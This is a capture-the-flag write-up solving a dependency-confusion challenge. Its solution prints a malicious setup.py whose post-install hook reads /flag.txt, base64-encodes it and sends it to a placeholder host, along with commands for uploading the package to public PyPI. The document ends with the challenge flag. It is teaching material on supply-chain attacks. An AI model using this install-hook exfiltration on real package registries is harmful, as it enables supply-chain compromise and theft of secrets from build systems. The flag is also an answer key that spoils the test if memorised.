#### Challenge:

An enemy of The Empire have a job for you. As an adversary he want to hack `CTFQ21EmpireTmp`. He heard that in their server is hosting their holy flag in /flag.txt

No IP address is needed in this task. Good luck.
̿̿ ̿̿ ̿̿ ̿'̿'\̵͇̿̿\з= ( ▀ ͜͞ʖ▀) =ε/̵͇̿̿/'̿'̿ ̿ ̿̿ ̿̿ ̿̿ 

Important: Whatever was the solution that you're going to adopt, if you want to use webhooks, DO NOT USE any of those that allows other participants to see the flag (don't use webhook.site, you may let other participants to catch the flag from there) (for example you can use requestbin instead of webhook.site since the flag can be seen by the authenticated user). Think about using a method that will not leave anybody else to read the flag from your steps. And don't forget to remove your work after you solve the task to avoid anybody else to steal it.

Hint 1: find the original web page (in the original website) that was sharing what you've found since that page is not updated

---

#### Solution:

- while searching for `CTFQ21EmpireTmp` we found an [stackoverflow](https://stackoverflow.com/questions/66717285/is-there-any-limit-in-pythons-requirements-txt-during-the-installation) post from `TheEmperor`, that told us that some kind of `CI/CD` install packages matching this regex `ctf-q21-empire-tmp-[a-z0-9\-]{5,10}`
- based on that we can prepare our own package that will leak the `flag` content via `setup` script

```python
from setuptools import setup
import os
from setuptools.command.install import install

class PostInstallCommand(install):
    """Post-installation for installation mode."""
    def run(self):
        install.run(self)
        # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION
        import requests
        requests.get("https://hostname/?secret="+os.popen("cat /flag.txt | base64").read())

setup(
    name='ctf-q21-empire-tmp-adeadbeef',
    description='666',
    version='6.6.6',
    packages=['main'],
    install_requires=[
      'requests',
    ],
    cmdclass={
        'install': PostInstallCommand
    }
    )
```

- this `setup.py` then can be `builded` and `packaged` for `pypi` and served to external `CI/CD` [ctf-q21-empire-tmp-adeadbeef-6.6.6.tar.gz](./ctf-q21-empire-tmp-adeadbeef-6.6.6.tar.gz ":ignore")

```bash
python3 -m pip install --upgrade build
python3 setup.py sdist
python3 -m pip install --user --upgrade twine
python3 -m twine upload --repository pypi dist/*
```

- after waiting for 5min we can decode the received message for flag

```console
This is what we call 'Dependency confusion' that is well explained here (this is not my article but I liked it) https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610 .  Which is part of the Open Source Software Supply Chain Attacks. Flag: Securinets{D3P3Nd3ncy_C0nFu5!n_xD_were_you_confused_enough} We didn't want to make it more difficult to take in consideration what all the teams need as requirements. This is why for the time being we are not requesting difficult task (just read this file is enough) but the missconfiguration here is tied with the --extra-index-url. You can check the /etc/pip.conf if you are curious to see if this is a real task or was it faked.
```
---

<details><summary>FLAG:</summary>

```
Securinets{D3P3Nd3ncy_C0nFu5!n_xD_were_you_confused_enough}
```

</details>
<br/>
